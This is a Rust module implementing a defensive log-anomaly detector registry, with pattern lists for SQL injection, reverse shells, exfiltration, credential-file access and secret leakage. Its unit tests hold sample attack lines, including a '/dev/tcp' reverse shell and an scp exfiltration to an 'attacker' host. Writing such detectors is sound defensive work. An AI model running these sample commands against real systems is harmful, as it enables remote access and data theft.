//! Detector framework with built-in log, integrity, and audit detectors.
//!
//! This is the first step toward a larger detector platform: a small registry
//! that can run built-in detectors over log entries and emit structured
//! anomalies that flow through the existing sniff/reporting pipeline.

pub mod audits;
mod integrity;
mod ml;

use std::collections::HashSet;

use anyhow::Result;
use serde::{Deserialize, Serialize};

pub use self::audits::ContainerPosture;

use self::audits::{ConfigAssessmentMonitor, DockerPostureMonitor, PackageInventoryMonitor};
use self::integrity::FileIntegrityMonitor;
use self::ml::MlBehavioralDetector;
use crate::database::connection::DbPool;
use crate::sniff::analyzer::{AnomalySeverity, LogAnomaly};
use crate::sniff::reader::LogEntry;

/// High-level detector families that can be surfaced in alerts and APIs.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum DetectorFamily {
    Web,
    Exfiltration,
    Execution,
    FileAccess,
    Integrity,
    Configuration,
    Container,
    Vulnerability,
    Cloud,
    Secrets,
}

impl std::fmt::Display for DetectorFamily {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            DetectorFamily::Web => write!(f, "Web"),
            DetectorFamily::Exfiltration => write!(f, "Exfiltration"),
            DetectorFamily::Execution => write!(f, "Execution"),
            DetectorFamily::FileAccess => write!(f, "FileAccess"),
            DetectorFamily::Integrity => write!(f, "Integrity"),
            DetectorFamily::Configuration => write!(f, "Configuration"),
            DetectorFamily::Container => write!(f, "Container"),
            DetectorFamily::Vulnerability => write!(f, "Vulnerability"),
            DetectorFamily::Cloud => write!(f, "Cloud"),
            DetectorFamily::Secrets => write!(f, "Secrets"),
        }
    }
}

/// Structured finding emitted by a detector before being converted to a log anomaly.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct DetectorFinding {
    pub detector_id: String,
    pub family: DetectorFamily,
    pub description: String,
    pub severity: AnomalySeverity,
    pub confidence: u8,
    pub sample_line: String,
}

impl DetectorFinding {
    pub fn to_log_anomaly(&self) -> LogAnomaly {
        LogAnomaly {
            description: self.description.clone(),
            severity: self.severity.clone(),
            sample_line: self.sample_line.clone(),
            detector_id: Some(self.detector_id.clone()),
            detector_family: Some(self.family.to_string()),
            confidence: Some(self.confidence),
            suggested_action: None,
        }
    }
}

/// Detector contract for log-entry based detectors.
pub trait LogDetector: Send + Sync {
    fn id(&self) -> &'static str;
    fn family(&self) -> DetectorFamily;
    fn detect(&self, entries: &[LogEntry]) -> Vec<DetectorFinding>;
}

/// Registry for built-in and future pluggable detectors.
pub struct DetectorRegistry {
    detectors: Vec<Box<dyn LogDetector>>,
    integrity_monitor: FileIntegrityMonitor,
    config_assessment_monitor: ConfigAssessmentMonitor,
    package_inventory_monitor: PackageInventoryMonitor,
    docker_posture_monitor: DockerPostureMonitor,
}

impl DetectorRegistry {
    pub fn new() -> Self {
        Self {
            detectors: Vec::new(),
            integrity_monitor: FileIntegrityMonitor,
            config_assessment_monitor: ConfigAssessmentMonitor,
            package_inventory_monitor: PackageInventoryMonitor,
            docker_posture_monitor: DockerPostureMonitor,
        }
    }

    pub fn register<D>(&mut self, detector: D)
    where
        D: LogDetector + 'static,
    {
        self.detectors.push(Box::new(detector));
    }

    pub fn register_builtin_log_detectors(&mut self) {
        self.register(SqlInjectionProbeDetector);
        self.register(PathTraversalDetector);
        self.register(LoginBruteForceDetector);
        self.register(WebshellProbeDetector);
        self.register(ExfiltrationHeuristicDetector);
        self.register(ReverseShellDetector);
        self.register(SensitiveFileAccessDetector);
        self.register(SsrfMetadataDetector);
        self.register(ExfiltrationChainDetector);
        self.register(SecretLeakageDetector);
        self.register(WebArchiveProbeDetector);
        self.register(MlBehavioralDetector::new());
    }

    pub fn detect_log_anomalies(&self, entries: &[LogEntry]) -> Vec<LogAnomaly> {
        let mut anomalies = Vec::new();
        let mut fingerprints = HashSet::new();

        for detector in &self.detectors {
            for finding in detector.detect(entries) {
                let fingerprint = format!(
                    "{}:{}:{}",
                    finding.detector_id, finding.description, finding.sample_line
                );
                if fingerprints.insert(fingerprint) {
                    anomalies.push(finding.to_log_anomaly());
                }
            }
        }

        anomalies
    }

    pub fn detect_file_integrity_anomalies(
        &self,
        pool: &DbPool,
        paths: &[String],
    ) -> Result<Vec<LogAnomaly>> {
        Ok(self
            .integrity_monitor
            .detect(pool, paths)?
            .into_iter()
            .map(|finding| finding.to_log_anomaly())
            .collect())
    }

    pub fn detect_config_assessment_anomalies(&self, paths: &[String]) -> Result<Vec<LogAnomaly>> {
        Ok(self
            .config_assessment_monitor
            .detect(paths)?
            .into_iter()
            .map(|finding| finding.to_log_anomaly())
            .collect())
    }

    pub fn detect_package_inventory_anomalies(&self, paths: &[String]) -> Result<Vec<LogAnomaly>> {
        Ok(self
            .package_inventory_monitor
            .detect(paths)?
            .into_iter()
            .map(|finding| finding.to_log_anomaly())
            .collect())
    }

    pub fn detect_docker_posture_anomalies(
        &self,
        postures: &[ContainerPosture],
    ) -> Vec<LogAnomaly> {
        self.docker_posture_monitor
            .detect(postures)
            .into_iter()
            .map(|finding| finding.to_log_anomaly())
            .collect()
    }
}

impl Default for DetectorRegistry {
    fn default() -> Self {
        let mut registry = Self::new();
        registry.register_builtin_log_detectors();
        registry
    }
}

struct SqlInjectionProbeDetector;
struct PathTraversalDetector;
struct LoginBruteForceDetector;
struct WebshellProbeDetector;
struct ExfiltrationHeuristicDetector;
struct ReverseShellDetector;
struct SensitiveFileAccessDetector;
struct SsrfMetadataDetector;
struct ExfiltrationChainDetector;
struct SecretLeakageDetector;
struct WebArchiveProbeDetector;

impl LogDetector for SqlInjectionProbeDetector {
    fn id(&self) -> &'static str {
        "web.sqli-probe"
    }

    fn family(&self) -> DetectorFamily {
        DetectorFamily::Web
    }

    fn detect(&self, entries: &[LogEntry]) -> Vec<DetectorFinding> {
        let matches = matching_entries(
            entries,
            &[
                "union select",
                "or 1=1",
                "sleep(",
                "benchmark(",
                "information_schema",
                "sql syntax",
                "select%20",
            ],
        );

        if matches.len() < 2 {
            return Vec::new();
        }

        vec![DetectorFinding {
            detector_id: self.id().to_string(),
            family: self.family(),
            description: format!(
                "Potential SQL injection probing detected in {} log entries",
                matches.len()
            ),
            severity: threshold_severity(matches.len(), 2, 5),
            confidence: 84,
            sample_line: matches[0].line.clone(),
        }]
    }
}

impl LogDetector for PathTraversalDetector {
    fn id(&self) -> &'static str {
        "web.path-traversal"
    }

    fn family(&self) -> DetectorFamily {
        DetectorFamily::Web
    }

    fn detect(&self, entries: &[LogEntry]) -> Vec<DetectorFinding> {
        let matches = matching_entries(
            entries,
            &["../", "..%2f", "%2e%2e%2f", "/etc/passwd", "win.ini"],
        );

        if matches.is_empty() {
            return Vec::new();
        }

        vec![DetectorFinding {
            detector_id: self.id().to_string(),
            family: self.family(),
            description: format!(
                "Path traversal probing indicators found in {} log entries",
                matches.len()
            ),
            severity: threshold_severity(matches.len(), 1, 4),
            confidence: 82,
            sample_line: matches[0].line.clone(),
        }]
    }
}

impl LogDetector for LoginBruteForceDetector {
    fn id(&self) -> &'static str {
        "web.login-bruteforce"
    }

    fn family(&self) -> DetectorFamily {
        DetectorFamily::Web
    }

    fn detect(&self, entries: &[LogEntry]) -> Vec<DetectorFinding> {
        let matches = matching_entries(
            entries,
            &[
                "failed password",
                "authentication failure",
                "invalid user",
                "login failed",
                "too many login failures",
                "401",
            ],
        );

        if matches.len() < 5 {
            return Vec::new();
        }

        vec![DetectorFinding {
            detector_id: self.id().to_string(),
            family: self.family(),
            description: format!(
                "Repeated authentication failures suggest a brute-force attempt ({} matching entries)",
                matches.len()
            ),
            severity: threshold_severity(matches.len(), 5, 10),
            confidence: 78,
            sample_line: matches[0].line.clone(),
        }]
    }
}

impl LogDetector for WebshellProbeDetector {
    fn id(&self) -> &'static str {
        "web.webshell-probe"
    }

    fn family(&self) -> DetectorFamily {
        DetectorFamily::Web
    }

    fn detect(&self, entries: &[LogEntry]) -> Vec<DetectorFinding> {
        let matches = matching_entries(
            entries,
            &[
                "cmd=",
                "exec=",
                "shell=",
                "powershell",
                "/bin/sh",
                "wget http",
                "curl http",
                "c99",
                "r57",
            ],
        );

        if matches.is_empty() {
            return Vec::new();
        }

        vec![DetectorFinding {
            detector_id: self.id().to_string(),
            family: self.family(),
            description: "Webshell or remote command execution probing indicators detected"
                .to_string(),
            severity: AnomalySeverity::High,
            confidence: 88,
            sample_line: matches[0].line.clone(),
        }]
    }
}

impl LogDetector for ExfiltrationHeuristicDetector {
    fn id(&self) -> &'static str {
        "exfiltration.egress-heuristic"
    }

    fn family(&self) -> DetectorFamily {
        DetectorFamily::Exfiltration
    }

    fn detect(&self, entries: &[LogEntry]) -> Vec<DetectorFinding> {
        let command_matches = matching_entries(
            entries,
            &[
                "sendmail",
                "postfix/smtp",
                "smtp",
                "curl -t",
                "scp ",
                "rsync ",
                "aws s3 cp",
                "gpg --encrypt",
                "exfil",
                "attachment",
                "bytes sent",
                "uploaded",
            ],
        );
        let large_transfer_matches: Vec<&LogEntry> = entries
            .iter()
            .filter(|entry| line_has_large_transfer(&entry.line))
            .collect();

        let score = command_matches.len() + large_transfer_matches.len();
        if score < 2 {
            return Vec::new();
        }

        let sample = command_matches
            .first()
            .copied()
            .or_else(|| large_transfer_matches.first().copied())
            .expect("score >= 2 guarantees at least one match");

        vec![DetectorFinding {
            detector_id: self.id().to_string(),
            family: self.family(),
            description: format!(
                "Possible outbound data exfiltration activity detected ({} suspicious transfer indicators)",
                score
            ),
            severity: threshold_severity(score, 2, 5),
            confidence: if !large_transfer_matches.is_empty() { 86 } else { 74 },
            sample_line: sample.line.clone(),
        }]
    }
}

impl LogDetector for ReverseShellDetector {
    fn id(&self) -> &'static str {
        "execution.reverse-shell"
    }

    fn family(&self) -> DetectorFamily {
        DetectorFamily::Execution
    }

    fn detect(&self, entries: &[LogEntry]) -> Vec<DetectorFinding> {
        let shell_matches = matching_entries(
            entries,
            &[
                "bash -i",
                "/dev/tcp/",
                "nc -e",
                "ncat -e",
                "mkfifo /tmp/",
                "python -c",
                "import socket",
                "pty.spawn",
                "socat tcp",
                "powershell -nop",
            ],
        );
        let network_matches = matching_entries(
            entries,
            &[
                "connect to ",
                "dial tcp",
                "connection to ",
                "remote host",
                "reverse shell",
                "listening on",
            ],
        );

        if shell_matches.is_empty() || network_matches.is_empty() {
            return Vec::new();
        }

        vec![DetectorFinding {
            detector_id: self.id().to_string(),
            family: self.family(),
            description: "Potential reverse shell behavior detected from shell execution plus network activity".to_string(),
            severity: AnomalySeverity::Critical,
            confidence: 91,
            sample_line: shell_matches[0].line.clone(),
        }]
    }
}

impl LogDetector for SensitiveFileAccessDetector {
    fn id(&self) -> &'static str {
        "file.sensitive-access"
    }

    fn family(&self) -> DetectorFamily {
        DetectorFamily::FileAccess
    }

    fn detect(&self, entries: &[LogEntry]) -> Vec<DetectorFinding> {
        let matches = matching_entries(
            entries,
            &[
                "/etc/shadow",
                "/root/.ssh/id_rsa",
                "/home/",
                ".aws/credentials",
                ".kube/config",
                ".env",
                "authorized_keys",
                "known_hosts",
                "secrets.yaml",
            ],
        )
        .into_iter()
        .filter(|entry| {
            contains_any(
                &entry.line,
                &["open", "read", "cat", "cp ", "access", "download"],
            )
        })
        .collect::<Vec<_>>();

        if matches.is_empty() {
            return Vec::new();
        }

        vec![DetectorFinding {
            detector_id: self.id().to_string(),
            family: self.family(),
            description: format!(
                "Sensitive file access indicators detected in {} log entries",
                matches.len()
            ),
            severity: threshold_severity(matches.len(), 1, 3),
            confidence: 87,
            sample_line: matches[0].line.clone(),
        }]
    }
}

impl LogDetector for SsrfMetadataDetector {
    fn id(&self) -> &'static str {
        "cloud.metadata-ssrf"
    }

    fn family(&self) -> DetectorFamily {
        DetectorFamily::Cloud
    }

    fn detect(&self, entries: &[LogEntry]) -> Vec<DetectorFinding> {
        let matches = matching_entries(
            entries,
            &[
                "169.254.169.254",
                "latest/meta-data",
                "metadata.google.internal",
                "computemetadata/v1",
                "/metadata/instance",
                "x-aws-ec2-metadata-token",
            ],
        );

        if matches.is_empty() {
            return Vec::new();
        }

        vec![DetectorFinding {
            detector_id: self.id().to_string(),
            family: self.family(),
            description: "Possible SSRF or direct cloud metadata access detected".to_string(),
            severity: threshold_severity(matches.len(), 1, 3),
            confidence: 89,
            sample_line: matches[0].line.clone(),
        }]
    }
}

impl LogDetector for ExfiltrationChainDetector {
    fn id(&self) -> &'static str {
        "exfiltration.chain"
    }

    fn family(&self) -> DetectorFamily {
        DetectorFamily::Exfiltration
    }

    fn detect(&self, entries: &[LogEntry]) -> Vec<DetectorFinding> {
        let archive_matches = matching_entries(
            entries,
            &[
                "tar cz",
                "zip -r",
                "gzip ",
                "7z a",
                "gpg --encrypt",
                "openssl enc",
                "archive created",
            ],
        );
        let transfer_matches = matching_entries(
            entries,
            &[
                "scp ",
                "rsync ",
                "curl -t",
                "aws s3 cp",
                "sendmail",
                "smtp",
                "ftp put",
                "upload complete",
            ],
        );

        if archive_matches.is_empty() || transfer_matches.is_empty() {
            return Vec::new();
        }

        vec![DetectorFinding {
            detector_id: self.id().to_string(),
            family: self.family(),
            description: "Possible exfiltration chain detected: archive/encrypt followed by outbound transfer".to_string(),
            severity: AnomalySeverity::High,
            confidence: 90,
            sample_line: archive_matches[0].line.clone(),
        }]
    }
}

impl LogDetector for SecretLeakageDetector {
    fn id(&self) -> &'static str {
        "secrets.log-leakage"
    }

    fn family(&self) -> DetectorFamily {
        DetectorFamily::Secrets
    }

    fn detect(&self, entries: &[LogEntry]) -> Vec<DetectorFinding> {
        let matches: Vec<&LogEntry> = entries
            .iter()
            .filter(|entry| line_contains_secret(&entry.line))
            .collect();

        if matches.is_empty() {
            return Vec::new();
        }

        vec![DetectorFinding {
            detector_id: self.id().to_string(),
            family: self.family(),
            description: format!(
                "Potential secret leakage detected in {} log entries",
                matches.len()
            ),
            severity: threshold_severity(matches.len(), 1, 2),
            confidence: 92,
            sample_line: matches[0].line.clone(),
        }]
    }
}

impl LogDetector for WebArchiveProbeDetector {
    fn id(&self) -> &'static str {
        "web.archive-probe"
    }

    fn family(&self) -> DetectorFamily {
        DetectorFamily::Web
    }

    fn detect(&self, entries: &[LogEntry]) -> Vec<DetectorFinding> {
        let matches = matching_entries(
            entries,
            &[
                ".zip", ".tar.gz", ".tgz", ".sql", ".7z", ".rar", ".tar.bz2", ".tar.xz", ".dump",
                ".bak",
            ],
        );

        if matches.len() < 3 {
            return Vec::new();
        }

        vec![DetectorFinding {
            detector_id: self.id().to_string(),
            family: self.family(),
            description: format!(
                "Suspicious archive/backup file probing detected in {} HTTP requests",
                matches.len()
            ),
            severity: threshold_severity(matches.len(), 3, 8),
            confidence: 82,
            sample_line: matches[0].line.clone(),
        }]
    }
}

fn matching_entries<'a>(entries: &'a [LogEntry], patterns: &[&str]) -> Vec<&'a LogEntry> {
    entries
        .iter()
        .filter(|entry| contains_any(&entry.line, patterns))
        .collect()
}

fn contains_any(line: &str, patterns: &[&str]) -> bool {
    let lower = line.to_ascii_lowercase();
    patterns.iter().any(|pattern| lower.contains(pattern))
}

fn threshold_severity(
    count: usize,
    medium_threshold: usize,
    high_threshold: usize,
) -> AnomalySeverity {
    if count >= high_threshold {
        AnomalySeverity::High
    } else if count >= medium_threshold {
        AnomalySeverity::Medium
    } else {
        AnomalySeverity::Low
    }
}

fn line_has_large_transfer(line: &str) -> bool {
    extract_named_number(line, "bytes=")
        .or_else(|| extract_named_number(line, "size="))
        .is_some_and(|value| value >= 1_000_000)
}

fn extract_named_number(line: &str, needle: &str) -> Option<u64> {
    let lower = line.to_ascii_lowercase();
    let start = lower.find(needle)? + needle.len();
    let digits: String = lower[start..]
        .chars()
        .take_while(|ch| ch.is_ascii_digit())
        .collect();
    (!digits.is_empty())
        .then(|| digits.parse::<u64>().ok())
        .flatten()
}

fn line_contains_secret(line: &str) -> bool {
    let lower = line.to_ascii_lowercase();
    lower.contains("authorization: bearer ")
        || lower.contains("x-api-key")
        || lower.contains("database_url=")
        || lower.contains("postgres://")
        || lower.contains("mysql://")
        || lower.contains("-----begin private key-----")
        || lower.contains("aws_secret_access_key")
        || lower.contains("slack_webhook")
        || lower.contains("token=")
        || contains_aws_access_key(line)
        || contains_github_token(line)
}

fn contains_aws_access_key(line: &str) -> bool {
    line.as_bytes().windows(20).any(|window| {
        window.starts_with(b"AKIA")
            && window[4..]
                .iter()
                .all(|byte| byte.is_ascii_uppercase() || byte.is_ascii_digit())
    })
}

fn contains_github_token(line: &str) -> bool {
    let lower = line.to_ascii_lowercase();
    ["ghp_", "github_pat_", "gho_", "ghu_", "ghs_"]
        .iter()
        .any(|prefix| lower.contains(prefix))
}

#[cfg(test)]
mod tests {
    use super::*;
    use chrono::Utc;
    use std::collections::HashMap;

    fn make_entries(lines: &[&str]) -> Vec<LogEntry> {
        lines
            .iter()
            .map(|line| LogEntry {
                source_id: "test-source".into(),
                timestamp: Utc::now(),
                line: (*line).into(),
                metadata: HashMap::new(),
            })
            .collect()
    }

    #[test]
    fn test_registry_detects_web_probe_and_exfiltration_families() {
        let registry = DetectorRegistry::default();
        let anomalies = registry.detect_log_anomalies(&make_entries(&[
            r#"GET /search?q=' OR 1=1 -- HTTP/1.1"#,
            r#"GET /search?q=UNION SELECT password FROM users HTTP/1.1"#,
            r#"sendmail invoked for attachment upload bytes=2500000"#,
            r#"smtp delivery queued bytes=3500000"#,
        ]));

        assert!(anomalies
            .iter()
            .any(|item| item.detector_family.as_deref() == Some("Web")));
        assert!(anomalies
            .iter()
            .any(|item| item.detector_family.as_deref() == Some("Exfiltration")));
    }

    #[test]
    fn test_registry_detects_bruteforce() {
        let registry = DetectorRegistry::default();
        let anomalies = registry.detect_log_anomalies(&make_entries(&[
            "Failed password for root from 192.0.2.10 port 22 ssh2",
            "Failed password for root from 192.0.2.10 port 22 ssh2",
            "Failed password for root from 192.0.2.10 port 22 ssh2",
            "Failed password for root from 192.0.2.10 port 22 ssh2",
            "Failed password for root from 192.0.2.10 port 22 ssh2",
        ]));

        assert_eq!(anomalies.len(), 1);
        assert_eq!(
            anomalies[0].detector_id.as_deref(),
            Some("web.login-bruteforce")
        );
    }

    #[test]
    fn test_large_transfer_parser() {
        assert!(line_has_large_transfer("uploaded archive bytes=1200000"));
        assert!(line_has_large_transfer("transfer complete size=2500000"));
        assert!(!line_has_large_transfer("uploaded bytes=1024"));
    }

    #[test]
    fn test_registry_detects_reverse_shell() {
        let registry = DetectorRegistry::default();
        let anomalies = registry.detect_log_anomalies(&make_entries(&[
            "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1",
            "connection to remote host 203.0.113.10 established",
        ]));

        assert!(anomalies
            .iter()
            .any(|item| item.detector_id.as_deref() == Some("execution.reverse-shell")));
    }

    #[test]
    fn test_registry_detects_sensitive_file_access() {
        let registry = DetectorRegistry::default();
        let anomalies = registry.detect_log_anomalies(&make_entries(&[
            "openat path=/etc/shadow pid=1234",
            "read /etc/shadow by suspicious process",
        ]));

        assert!(anomalies
            .iter()
            .any(|item| item.detector_id.as_deref() == Some("file.sensitive-access")));
    }

    #[test]
    fn test_registry_detects_metadata_ssrf() {
        let registry = DetectorRegistry::default();
        let anomalies = registry.detect_log_anomalies(&make_entries(&[
            "GET http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        ]));

        assert!(anomalies
            .iter()
            .any(|item| item.detector_id.as_deref() == Some("cloud.metadata-ssrf")));
    }

    #[test]
    fn test_registry_detects_exfiltration_chain() {
        let registry = DetectorRegistry::default();
        let anomalies = registry.detect_log_anomalies(&make_entries(&[
            "tar czf /tmp/archive.tgz /srv/data",
            "scp /tmp/archive.tgz attacker@203.0.113.5:/tmp/",
        ]));

        assert!(anomalies
            .iter()
            .any(|item| item.detector_id.as_deref() == Some("exfiltration.chain")));
    }

    #[test]
    fn test_registry_detects_secret_leakage() {
        let registry = DetectorRegistry::default();
        let anomalies = registry.detect_log_anomalies(&make_entries(&[
            "Authorization: Bearer super-secret-token",
            "AWS_SECRET_ACCESS_KEY=abc123",
        ]));

        assert!(anomalies
            .iter()
            .any(|item| item.detector_id.as_deref() == Some("secrets.log-leakage")));
    }

    #[test]
    fn test_secret_detectors_identify_provider_specific_tokens() {
        assert!(contains_github_token("github_pat_1234567890"));
        assert!(contains_aws_access_key("AKIAABCDEFGHIJKLMNOP"));
        assert!(!contains_aws_access_key("AKIAshort"));
    }
}
